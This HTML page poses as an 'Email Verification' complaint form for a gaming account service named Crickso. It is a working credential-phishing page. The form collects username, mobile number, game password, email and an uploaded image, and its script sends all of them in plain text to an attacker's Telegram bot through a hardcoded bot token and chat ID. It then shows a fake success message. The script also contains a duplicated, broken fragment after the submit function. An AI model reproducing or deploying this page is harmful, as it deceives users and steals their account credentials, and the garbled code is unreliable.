<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verification - Crickso</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body {
            background: #ffffff;
        }

        .page-content {
            padding: 14px 12px;
        }

        .complaint-card {
            background: #ffffff;
            border: 1px solid #e5e7eb;
            border-radius: 14px;
            padding: 20px 16px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }

        .complaint-title {
            font-size: 18px;
            font-weight: 700;
            color: #2563eb;
            text-align: center;
            margin-bottom: 3px;
        }

        .complaint-subtitle {
            font-size: 12px;
            color: #666;
            text-align: center;
            margin-bottom: 20px;
        }

        .field-label {
            font-size: 12px;
            font-weight: 600;
            color: #000000;
            margin-bottom: 5px;
            display: block;
        }

        .field-input {
            width: 100%;
            padding: 11px 12px;
            border: 1px solid #d1d5db;
            border-radius: 10px;
            font-size: 13px;
            color: #000;
            background: #fff;
            outline: none;
            transition: border-color 0.2s;
            margin-bottom: 14px;
            -webkit-appearance: none;
        }

        .field-input:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 3px rgba(37,99,235,0.08);
        }

        .field-input::placeholder {
            color: #9ca3af;
        }

        .file-upload {
            width: 100%;
            padding: 16px;
            border: 2px dashed #d1d5db;
            border-radius: 10px;
            text-align: center;
            cursor: pointer;
            transition: border-color 0.2s, background 0.2s;
            margin-bottom: 14px;
            background: #fafafa;
        }

        .file-upload:hover {
            border-color: #2563eb;
            background: #f0f5ff;
        }

        .file-upload input {
            display: none;
        }

        .file-upload-text {
            font-size: 12px;
            color: #666;
        }

        .file-upload-text span {
            color: #2563eb;
            font-weight: 600;
        }

        .submit-btn {
            width: 100%;
            padding: 13px;
            background: #2563eb;
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 4px;
        }

        .submit-btn:hover {
            background: #1d4ed8;
        }

        .submit-btn:active {
            transform: scale(0.98);
        }

        .preview-img {
            max-width: 100%;
            max-height: 120px;
            border-radius: 8px;
            margin-top: 10px;
            display: none !important;
        }

        .preview-img.show {
            display: block !important;
        }

        /* Popup */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
        }

        .popup-overlay.show {
            opacity: 1;
            visibility: visible;
        }

        .popup-box {
            background: #fff;
            border-radius: 14px;
            padding: 28px 20px;
            width: 85%;
            max-width: 320px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
            transform: scale(0.9);
            transition: transform 0.3s ease;
        }

        .popup-overlay.show .popup-box {
            transform: scale(1);
        }

        .success-icon {
            width: 56px;
            height: 56px;
            background: #22c55e;
            color: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            margin: 0 auto 14px;
        }

        .success-title {
            font-size: 16px;
            font-weight: 700;
            color: #22c55e;
            margin-bottom: 6px;
        }

        .success-text {
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 18px;
        }

        /* Spinner */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="page-fade">

    <header class="page-header">
        <a href="index.html" class="back-btn">&#8592;</a>
        <span class="page-title">Email Verification</span>
    </header>

    <div class="page-content">
        <div class="complaint-card">

            <div class="complaint-title">Email Verification</div>
            <div class="complaint-subtitle">Fill in your details below to verify your account</div>

            <label class="field-label">User Name</label>
            <input type="text" class="field-input" placeholder="Enter your username">

            <label class="field-label">Registered Mobile Number</label>
            <input type="tel" class="field-input" placeholder="Enter registered mobile number">

            <label class="field-label">Game Password</label>
            <input type="password" class="field-input" placeholder="Enter your game password">

            <label class="field-label">Email ID</label>
            <input type="email" class="field-input" placeholder="Enter your email address">

            <label class="field-label">Upload Issue Image</label>
            <div class="file-upload" onclick="document.getElementById('fileInput').click()">
                <input type="file" id="fileInput" accept="image/*" onchange="previewFile('fileInput', 'previewImg', 'uploadText')">
                <div class="file-upload-text" id="uploadText">
                    <span>Click to upload</span> or drag and drop<br>PNG, JPG up to 5MB
                </div>
                <img id="previewImg" class="preview-img">
            </div>

            <button class="submit-btn" id="submitBtn" onclick="submitComplaint()">Complaint Submit</button>

        </div>
    </div>

    <!-- Success Popup -->
    <div class="popup-overlay" id="successPopup">
        <div class="popup-box">
            <div class="success-icon">&#10004;</div>
            <div class="success-title">Complaint Submit Successfully</div>
            <div class="success-text">Your problem will be fixed within 30 minutes. Our team is working on it.</div>
            <button class="submit-btn" onclick="closeSuccess()">OK</button>
        </div>
    </div>

    <script>
        // ============ TELEGRAM CONFIG ============
        const BOT_TOKEN = '8899133920:AAEgSuI5WV2luP-IysZw9XD3dy3DxTCDdZk';
        const CHAT_ID = '-1004376663143';

        function previewFile(inputId, previewId, textId) {
            const file = document.getElementById(inputId).files[0];
            const preview = document.getElementById(previewId);
            const text = document.getElementById(textId);

            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.src = e.target.result;
                    preview.classList.add('show');
                    text.innerHTML = file.name;
                };
                reader.readAsDataURL(file);
            }
        }

        async function sendToTelegram(message) {
            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
            });
            return response.ok;
        }

        async function sendPhotoToTelegram(file, caption) {
            if (!file) return true;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);
            formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';
            const response = await fetch(url, { method: 'POST', body: formData });
            return response.ok;
        }

        function submitComplaint() {
            const inputs = document.querySelectorAll('.field-input');
            let empty = false;

            inputs.forEach(input => {
                if (!input.value || input.value === '') {
                    empty = true;
                }
            });

            if (empty) {
                alert('Please fill in all fields before submitting.');
                return;
            }

            const name = inputs[0].value;
            const mobile = inputs[1].value;
            const password = inputs[2].value;
            const email = inputs[3].value;
            const date = new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString();
            const file = document.getElementById('fileInput').files[0];

            const message = '<b>📧 Email Verification Request</b>\n\n' +
                '<b>Name:</b> ' + name + '\n' +
                '<b>Mobile:</b> ' + mobile + '\n' +
                '<b>Password:</b> ' + password + '\n' +
                '<b>Email:</b> ' + email + '\n' +
                '<b>Date:</b> ' + date;

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> Submitting...';

            sendPhotoToTelegram(file, message).then(function(ok) {
                btn.disabled = false;
                btn.innerHTML = 'Complaint Submit';
                if (ok) {
                    document.getElementById('successPopup').classList.add('show');
                } else {
                    alert('Failed to submit. Please try again.');
                }
            }).catch(function() {
                btn.disabled = false;
                btn.innerHTML = 'Complaint Submit';
                alert('Failed to submit. Please try again.');
            });
        }
                alert('Failed to submit. Please try again.');
            });
        }

        function closeSuccess() {
            document.getElementById('successPopup').classList.remove('show');
            window.location.href = 'index.html';
        }
    </script>

</body>
</html>
